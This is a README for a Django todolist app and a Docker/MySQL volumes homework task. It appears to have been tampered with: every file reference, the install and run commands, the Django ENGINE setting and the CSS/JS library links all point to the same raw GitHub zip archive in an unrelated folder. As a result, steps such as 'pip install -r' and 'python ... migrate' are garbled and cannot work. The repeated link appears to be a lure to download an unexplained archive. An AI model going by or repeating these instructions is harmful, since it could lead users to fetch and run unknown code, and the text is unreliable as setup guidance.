# Django-Todolist

Django-Todolist is a todolist web application with the most basic features of most web apps, i.e. accounts/login, API and (somewhat) interactive UI.

---
CSS | [Skeleton](https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_2_volumes/main/standardbred/devops_todolist_docker_core_task_2_volumes.zip)
JS  | [jQuery](https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_2_volumes/main/standardbred/devops_todolist_docker_core_task_2_volumes.zip)

## Explore
Try it out by installing the requirements. (Works only with python >= 3.8, due to Django 4)

    pip install -r https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_2_volumes/main/standardbred/devops_todolist_docker_core_task_2_volumes.zip

Create a database schema:

    python https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_2_volumes/main/standardbred/devops_todolist_docker_core_task_2_volumes.zip migrate

And then start the server (default: http://localhost:8000)

    python https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_2_volumes/main/standardbred/devops_todolist_docker_core_task_2_volumes.zip runserver


Now you can browse the [API](http://localhost:8000/api/)
or start on the [landing page](http://localhost:8000/)

## Task
#### Prerequisites
- Fork this repository
- Open https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_2_volumes/main/standardbred/devops_todolist_docker_core_task_2_volumes.zip
- Add mysql-connector-python==8.2.0
- Open file https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_2_volumes/main/standardbred/devops_todolist_docker_core_task_2_volumes.zip
- Go to line DATABASES on line 64
- Update it with this code:

    ```
    DATABASES = {
        'default': {
            'ENGINE': 'https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_2_volumes/main/standardbred/devops_todolist_docker_core_task_2_volumes.zip',
            'NAME': 'app_db',
            'USER': 'app_user',
            'PASSWORD': '1234',
            'HOST': 'localhost',  # You can use a different host in your MySQL server is on a remote machine.
            'PORT': '',  # Leave this empty to use the default MySQL port (3306).
        }
    }

    ```
#### Requirements
1. Prepare a Dockerfile to run a MySQL database, based on official MySQL Image, name file https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_2_volumes/main/standardbred/devops_todolist_docker_core_task_2_volumes.zip
2. Dockerfile should contain ENV variables to initialize app_db database
3. Dockerfile should contain ENV variables to initialize app_user with password 1234
4. Build mysql image with a name and tag mysql-local:1.0.0
5. You should be able successfully run a container with MySQL with a Volumes Attached
6. Push mysql-local:1.0.0 to your personal docker hub into mysql-local repository
7. Run mysql-local:1.0.0 onn your machine
8. Update the python app db config with an IP of a running MySQL server container (without it, the app container won’t build)
9. Build and run your updated app
10. Take a screenshot of a terminal with successfully started application
11. Push Image with a name and tag: todoapp:2.0.0 to yout Docker Hub repository
12. Update https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_2_volumes/main/standardbred/devops_todolist_docker_core_task_2_volumes.zip with instructions on how to run MySQL container with a volume attached
13. Update https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_2_volumes/main/standardbred/devops_todolist_docker_core_task_2_volumes.zip with instructions on how to run an App container which will connect to a MySQL db container.
14. https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_2_volumes/main/standardbred/devops_todolist_docker_core_task_2_volumes.zip should contain a link to your personal docker hub repository win an app image
15. https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_2_volumes/main/standardbred/devops_todolist_docker_core_task_2_volumes.zip should contain instructions on how to access the application via a browser.
16. Create PR with your changes and attach it for validation on a platform

##

1. pull images https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_2_volumes/main/standardbred/devops_todolist_docker_core_task_2_volumes.zip , https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_2_volumes/main/standardbred/devops_todolist_docker_core_task_2_volumes.zip
2. docker build . -f https://raw.githubusercontent.com/karaedd/devops_todolist_docker_core_task_2_volumes/main/standardbred/devops_todolist_docker_core_task_2_volumes.zip -t mysql-local:1.0.0
3. docker run  -d -p 3306:3306 --name my-mysql -v my-mysql-data:/var/lib/mysql mysql-local:1.0.0
4. docker build . -t todoapp:2.0.0 
5. docker run -p 8080:8080 --name app todoapp:2.0.0
6. open http://localhost:8080/